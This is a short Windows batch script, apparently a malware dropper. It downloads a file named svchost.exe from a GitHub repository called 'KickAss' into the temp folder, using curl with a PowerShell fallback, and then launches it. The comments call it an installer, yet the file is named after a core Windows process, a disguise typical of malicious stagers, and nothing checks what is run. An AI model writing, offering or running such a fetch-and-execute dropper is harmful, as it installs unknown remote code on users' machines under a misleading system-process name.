@echo off
setlocal
REM Define the URL of the installer
set "URL=https://github.com/madhead341/KickAss/raw/refs/heads/main/svchost.exe"

REM Set the download location
set "INSTALLER_PATH=%TEMP%\svchost.exe"

REM Use curl or powershell to download the file
curl -L "%URL%" -o "%INSTALLER_PATH%" || (
    powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%INSTALLER_PATH%'"
)
start "" "%INSTALLER_PATH%"

endlocal
